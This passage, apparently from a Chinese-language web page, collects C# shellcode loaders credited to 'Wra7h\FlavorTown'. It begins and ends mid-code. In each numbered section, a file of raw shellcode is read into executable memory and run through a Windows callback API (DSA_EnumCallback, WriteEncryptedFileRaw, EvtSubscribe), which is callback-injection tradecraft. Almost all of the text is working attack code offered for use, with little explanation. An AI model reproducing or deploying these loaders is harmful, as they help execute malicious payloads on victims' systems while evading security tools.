hljs-number">33</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Process.GetCurrentProcess().Handle,<br><span class="linenum hljs-number">34</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;hAlloc,<br><span class="linenum hljs-number">35</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;payload.Length,<br><span class="linenum hljs-number">36</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-number">0x20</span>,&nbsp;<span class="hljs-comment">//RX</span><br><span class="linenum hljs-number">37</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-keyword">out</span>&nbsp;oldProtect);<br><span class="linenum hljs-number">38</span><br><span class="linenum hljs-number">39</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;IntPtr&nbsp;hDSA&nbsp;=&nbsp;DSA_Create(<span class="hljs-number">1</span>,&nbsp;<span class="hljs-number">1</span>);<br><span class="linenum hljs-number">40</span><br><span class="linenum hljs-number">41</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;DSA_InsertItem(hDSA,&nbsp;<span class="hljs-number">0x7fffffff</span>,&nbsp;hDSA);&nbsp;<span class="hljs-comment">//Append</span><br><span class="linenum hljs-number">42</span><br><span class="linenum hljs-number">43</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;DSA_EnumCallback(hDSA,&nbsp;hAlloc,&nbsp;IntPtr.Zero);<br><span class="linenum hljs-number">44</span><br><span class="linenum hljs-number">45</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;DSA_Destroy(hDSA);<br><span class="linenum hljs-number">46</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}<br><span class="linenum hljs-number">47</span><br><span class="linenum hljs-number">48</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;[<span class="hljs-meta">DllImport(<span class="hljs-meta-string">"kernel32"</span>)</span>]<br><span class="linenum hljs-number">49</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-function"><span class="hljs-keyword">static</span>&nbsp;<span class="hljs-keyword">extern</span>&nbsp;IntPtr&nbsp;<span class="hljs-title">VirtualAlloc</span>(<span class="hljs-params"><br><span class="linenum hljs-number">50</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;IntPtr&nbsp;lpAddress,<br><span class="linenum hljs-number">51</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-keyword">uint</span>&nbsp;dwSize,<br><span class="linenum hljs-number">52</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-keyword">uint</span>&nbsp;flAllocationType,<br><span class="linenum hljs-number">53</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-keyword">uint</span>&nbsp;flProtect</span>)</span>;<br><span class="linenum hljs-number">54</span><br><span class="linenum hljs-number">55</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;[<span class="hljs-meta">DllImport(<span class="hljs-meta-string">"kernel32.dll"</span>)</span>]<br><span class="linenum hljs-number">56</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-function"><span class="hljs-keyword">static</span>&nbsp;<span class="hljs-keyword">extern</span>&nbsp;<span class="hljs-keyword">bool</span>&nbsp;<span class="hljs-title">VirtualProtectEx</span>(<span class="hljs-params"><br><span class="linenum hljs-number">57</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;IntPtr&nbsp;hProcess,<br><span class="linenum hljs-number">58</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;IntPtr&nbsp;lpAddress,<br><span class="linenum hljs-number">59</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-keyword">int</span>&nbsp;dwSize,<br><span class="linenum hljs-number">60</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-keyword">uint</span>&nbsp;flNewProtect,<br><span class="linenum hljs-number">61</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-keyword">out</span>&nbsp;<span class="hljs-keyword">uint</span>&nbsp;lpflOldProtect</span>)</span>;<br><span class="linenum hljs-number">62</span><br><span class="linenum hljs-number">63</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;[<span class="hljs-meta">DllImport(<span class="hljs-meta-string">"Comctl32.dll"</span>)</span>]<br><span class="linenum hljs-number">64</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-function"><span class="hljs-keyword">static</span>&nbsp;<span class="hljs-keyword">extern</span>&nbsp;IntPtr&nbsp;<span class="hljs-title">DSA_Create</span>(<span class="hljs-params"><br><span class="linenum hljs-number">65</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-keyword">int</span>&nbsp;cbItem,<br><span class="linenum hljs-number">66</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-keyword">int</span>&nbsp;cItemGrow</span>)</span>;<br><span class="linenum hljs-number">67</span><br><span class="linenum hljs-number">68</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;[<span class="hljs-meta">DllImport(<span class="hljs-meta-string">"Comctl32.dll"</span>)</span>]<br><span class="linenum hljs-number">69</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-function"><span class="hljs-keyword">static</span>&nbsp;<span class="hljs-keyword">extern</span>&nbsp;<span class="hljs-keyword">void</span>&nbsp;<span class="hljs-title">DSA_InsertItem</span>(<span class="hljs-params"><br><span class="linenum hljs-number">70</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;IntPtr&nbsp;hdsa,<br><span class="linenum hljs-number">71</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-keyword">int</span>&nbsp;i,<br><span class="linenum hljs-number">72</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;IntPtr&nbsp;pItem</span>)</span>;<br><span class="linenum hljs-number">73</span><br><span class="linenum hljs-number">74</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;[<span class="hljs-meta">DllImport(<span class="hljs-meta-string">"Comctl32.dll"</span>)</span>]<br><span class="linenum hljs-number">75</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-function"><span class="hljs-keyword">static</span>&nbsp;<span class="hljs-keyword">extern</span>&nbsp;<span class="hljs-keyword">void</span>&nbsp;<span class="hljs-title">DSA_EnumCallback</span>(<span class="hljs-params"><br><span class="linenum hljs-number">76</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;IntPtr&nbsp;hdsa,<br><span class="linenum hljs-number">77</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;IntPtr&nbsp;pfnCB,<br><span class="linenum hljs-number">78</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;IntPtr&nbsp;pData</span>)</span>;<br><span class="linenum hljs-number">79</span><br><span class="linenum hljs-number">80</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;[<span class="hljs-meta">DllImport(<span class="hljs-meta-string">"Comctl32.dll"</span>)</span>]<br><span class="linenum hljs-number">81</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-function"><span class="hljs-keyword">static</span>&nbsp;<span class="hljs-keyword">extern</span>&nbsp;<span class="hljs-keyword">bool</span>&nbsp;<span class="hljs-title">DSA_Destroy</span>(<span class="hljs-params">IntPtr&nbsp;hdsa</span>)</span>;<br><span class="linenum hljs-number">82</span>&nbsp;&nbsp;&nbsp;&nbsp;}<br><span class="linenum hljs-number">83</span>}<br></code></pre>
<h1 id="h4cencryptedfileraw"><span>4.回调函数注入 (C#) 通过 EncryptedFileRaw</span></h1>
<pre><code class="hljs cs"><span class="linenum hljs-number"> 1</span><span class="hljs-comment">//&nbsp;Wra7h\FlavorTown</span><br><span class="linenum hljs-number"> 2</span><span class="hljs-comment">//&nbsp;Compile:&nbsp;Visual&nbsp;Studio&nbsp;2022&nbsp;&amp;&nbsp;.NET&nbsp;Fx&nbsp;3.5+</span><br><span class="linenum hljs-number"> 3</span><br><span class="linenum hljs-number"> 4</span><span class="hljs-keyword">using</span>&nbsp;System;<br><span class="linenum hljs-number"> 5</span><span class="hljs-keyword">using</span>&nbsp;System.Diagnostics;<br><span class="linenum hljs-number"> 6</span><span class="hljs-keyword">using</span>&nbsp;System.Runtime.InteropServices;<br><span class="linenum hljs-number"> 7</span><br><span class="linenum hljs-number"> 8</span><span class="hljs-keyword">namespace</span>&nbsp;<span class="hljs-title">EncryptedFileRaw</span><br><span class="linenum hljs-number"> 9</span>{<br><span class="linenum hljs-number">10</span>&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-keyword">internal</span>&nbsp;<span class="hljs-keyword">class</span>&nbsp;<span class="hljs-title">Program</span><br><span class="linenum hljs-number">11</span>&nbsp;&nbsp;&nbsp;&nbsp;{<br><span class="linenum hljs-number">12</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-function"><span class="hljs-keyword">static</span>&nbsp;<span class="hljs-keyword">void</span>&nbsp;<span class="hljs-title">Main</span>(<span class="hljs-params"><span class="hljs-keyword">string</span>[]&nbsp;args</span>)<br><span class="linenum hljs-number">13</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span>{<br><span class="linenum hljs-number">14</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-keyword">if</span>&nbsp;(args.Length&nbsp;&lt;&nbsp;<span class="hljs-number">1</span>)<br><span class="linenum hljs-number">15</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;{<br><span class="linenum hljs-number">16</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Console.WriteLine(<span class="hljs-string">"\nNo&nbsp;shellcode&nbsp;specified."</span>);<br><span class="linenum hljs-number">17</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Console.WriteLine(<span class="hljs-string">"Example&nbsp;Usage:&nbsp;EncryptedFileRaw.exe&nbsp;C:\\Path\\To\\Raw\\Shellcode.bin\n"</span>);<br><span class="linenum hljs-number">18</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;System.Environment.Exit(<span class="hljs-number">1</span>);<br><span class="linenum hljs-number">19</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}<br><span class="linenum hljs-number">20</span><br><span class="linenum hljs-number">21</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-keyword">byte</span>[]&nbsp;payload&nbsp;=&nbsp;System.IO.File.ReadAllBytes(args[<span class="hljs-number">0</span>]);<br><span class="linenum hljs-number">22</span><br><span class="linenum hljs-number">23</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;IntPtr&nbsp;hAlloc&nbsp;=&nbsp;VirtualAlloc(<br><span class="linenum hljs-number">24</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;IntPtr.Zero,<br><span class="linenum hljs-number">25</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;(<span class="hljs-keyword">uint</span>)payload.Length,<br><span class="linenum hljs-number">26</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-number">0x1000</span>&nbsp;<span class="hljs-comment">/*COMMIT*/</span>,<br><span class="linenum hljs-number">27</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-number">0x40</span>&nbsp;<span class="hljs-comment">/*RWX*/</span>);&nbsp;<br><span class="linenum hljs-number">28</span><br><span class="linenum hljs-number">29</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Marshal.Copy(payload,&nbsp;<span class="hljs-number">0</span>,&nbsp;hAlloc,&nbsp;payload.Length);<br><span class="linenum hljs-number">30</span><br><span class="linenum hljs-number">31</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-keyword">uint</span>&nbsp;oldProtect;<br><span class="linenum hljs-number">32</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;VirtualProtectEx(<br><span class="linenum hljs-number">33</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Process.GetCurrentProcess().Handle,<br><span class="linenum hljs-number">34</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;hAlloc,<br><span class="linenum hljs-number">35</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;payload.Length,<br><span class="linenum hljs-number">36</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-number">0x20</span>,&nbsp;<span class="hljs-comment">//RX</span><br><span class="linenum hljs-number">37</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-keyword">out</span>&nbsp;oldProtect);<br><span class="linenum hljs-number">38</span><br><span class="linenum hljs-number">39</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;IntPtr&nbsp;pvContext&nbsp;=&nbsp;IntPtr.Zero;<br><span class="linenum hljs-number">40</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-keyword">ulong</span>&nbsp;CREATE_FOR_IMPORT&nbsp;=&nbsp;<span class="hljs-number">1</span>;<br><span class="linenum hljs-number">41</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;OpenEncryptedFileRaw(System.IO.Path.GetTempFileName(),&nbsp;CREATE_FOR_IMPORT,&nbsp;<span class="hljs-keyword">out</span>&nbsp;pvContext);<br><span class="linenum hljs-number">42</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;WriteEncryptedFileRaw(hAlloc,&nbsp;IntPtr.Zero,&nbsp;pvContext);<br><span class="linenum hljs-number">43</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}<br><span class="linenum hljs-number">44</span><br><span class="linenum hljs-number">45</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;[<span class="hljs-meta">DllImport(<span class="hljs-meta-string">"kernel32"</span>)</span>]<br><span class="linenum hljs-number">46</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-function"><span class="hljs-keyword">public</span>&nbsp;<span class="hljs-keyword">static</span>&nbsp;<span class="hljs-keyword">extern</span>&nbsp;IntPtr&nbsp;<span class="hljs-title">VirtualAlloc</span>(<span class="hljs-params"><br><span class="linenum hljs-number">47</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;IntPtr&nbsp;lpAddress,<br><span class="linenum hljs-number">48</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-keyword">uint</span>&nbsp;dwSize,<br><span class="linenum hljs-number">49</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-keyword">uint</span>&nbsp;flAllocationType,<br><span class="linenum hljs-number">50</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-keyword">uint</span>&nbsp;flProtect</span>)</span>;<br><span class="linenum hljs-number">51</span><br><span class="linenum hljs-number">52</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;[<span class="hljs-meta">DllImport(<span class="hljs-meta-string">"kernel32.dll"</span>)</span>]<br><span class="linenum hljs-number">53</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-function"><span class="hljs-keyword">static</span>&nbsp;<span class="hljs-keyword">extern</span>&nbsp;<span class="hljs-keyword">bool</span>&nbsp;<span class="hljs-title">VirtualProtectEx</span>(<span class="hljs-params"><br><span class="linenum hljs-number">54</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;IntPtr&nbsp;hProcess,<br><span class="linenum hljs-number">55</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;IntPtr&nbsp;lpAddress,<br><span class="linenum hljs-number">56</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-keyword">int</span>&nbsp;dwSize,<br><span class="linenum hljs-number">57</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-keyword">uint</span>&nbsp;flNewProtect,<br><span class="linenum hljs-number">58</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-keyword">out</span>&nbsp;<span class="hljs-keyword">uint</span>&nbsp;lpflOldProtect</span>)</span>;<br><span class="linenum hljs-number">59</span><br><span class="linenum hljs-number">60</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;[<span class="hljs-meta">DllImport(<span class="hljs-meta-string">"Advapi32.dll"</span>)</span>]<br><span class="linenum hljs-number">61</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-function"><span class="hljs-keyword">static</span>&nbsp;<span class="hljs-keyword">extern</span>&nbsp;<span class="hljs-keyword">uint</span>&nbsp;<span class="hljs-title">OpenEncryptedFileRaw</span>(<span class="hljs-params"><br><span class="linenum hljs-number">62</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-keyword">string</span>&nbsp;lpFilename,<br><span class="linenum hljs-number">63</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-keyword">ulong</span>&nbsp;ulFlags,<br><span class="linenum hljs-number">64</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-keyword">out</span>&nbsp;IntPtr&nbsp;pvContext</span>)</span>;<br><span class="linenum hljs-number">65</span><br><span class="linenum hljs-number">66</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;[<span class="hljs-meta">DllImport(<span class="hljs-meta-string">"Advapi32.dll"</span>)</span>]<br><span class="linenum hljs-number">67</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-function"><span class="hljs-keyword">static</span>&nbsp;<span class="hljs-keyword">extern</span>&nbsp;<span class="hljs-keyword">uint</span>&nbsp;<span class="hljs-title">WriteEncryptedFileRaw</span>(<span class="hljs-params"><br><span class="linenum hljs-number">68</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;IntPtr&nbsp;pfImportCallback,<br><span class="linenum hljs-number">69</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;IntPtr&nbsp;pvCallbackContext,<br><span class="linenum hljs-number">70</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;IntPtr&nbsp;pvContext</span>)</span>;<br><span class="linenum hljs-number">71</span>&nbsp;&nbsp;&nbsp;&nbsp;}<br><span class="linenum hljs-number">72</span>}<br></code></pre>
<h1 id="h5cevtsubscribe_cveeventwrite"><span>5.回调函数注入 (C#) 通过 EvtSubscribe_CVEEventWrite</span></h1>
<pre><code class="hljs cs"><span class="linenum hljs-number"> 1</span><span class="hljs-comment">//&nbsp;Wra7h\FlavorTown</span><br><span class="linenum hljs-number"> 2</span><span class="hljs-comment">//&nbsp;Compile:&nbsp;Visual&nbsp;Studio&nbsp;2022&nbsp;&amp;&nbsp;.NET&nbsp;Fx&nbsp;3.5+</span><br><span class="linenum hljs-number"> 3</span><br><span class="linenum hljs-number"> 4</span><span class="hljs-keyword">using</span>&nbsp;System;<br><span class="linenum hljs-number"> 5</span><span class="hljs-keyword">using</span>&nbsp;System.Diagnostics;<br><span class="linenum hljs-number"> 6</span><span class="hljs-keyword">using</span>&nbsp;System.Runtime.InteropServices;<br><span class="linenum hljs-number"> 7</span><br><span class="linenum hljs-number"> 8</span><span class="hljs-keyword">namespace</span>&nbsp;<span class="hljs-title">EvtSubscribe_CVEEventWrite</span><br><span class="linenum hljs-number"> 9</span>{<br><span class="linenum hljs-number">10</span>&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-keyword">internal</span>&nbsp;<span class="hljs-keyword">class</span>&nbsp;<span class="hljs-title">Program</span><br><span class="linenum hljs-number">11</span>&nbsp;&nbsp;&nbsp;&nbsp;{<br><span class="linenum hljs-number">12</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-function"><span class="hljs-keyword">static</span>&nbsp;<span class="hljs-keyword">void</span>&nbsp;<span class="hljs-title">Main</span>(<span class="hljs-params"><span class="hljs-keyword">string</span>[]&nbsp;args</span>)<br><span class="linenum hljs-number">13</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span>{<br><span class="linenum hljs-number">14</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-keyword">if</span>&nbsp;(args.Length&nbsp;&lt;&nbsp;<span class="hljs-number">1</span>)<br><span class="linenum hljs-number">15</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;{<br><span class="linenum hljs-number">16</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Console.WriteLine(<span class="hljs-string">"\nNo&nbsp;shellcode&nbsp;specified."</span>);<br><span class="linenum hljs-number">17</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Console.WriteLine(<span class="hljs-string">"Example&nbsp;Usage:&nbsp;EvtSubscribe_CVEEventWrite.exe&nbsp;C:\\Path\\To\\Raw\\Shellcode.bin\n"</span>);<br><span class="linenum hljs-number">18</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;System.Environment.Exit(<span class="hljs-number">1</span>);<br><span class="linenum hljs-number">19</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}<br><span class="linenum hljs-number">20</span><br><span class="linenum 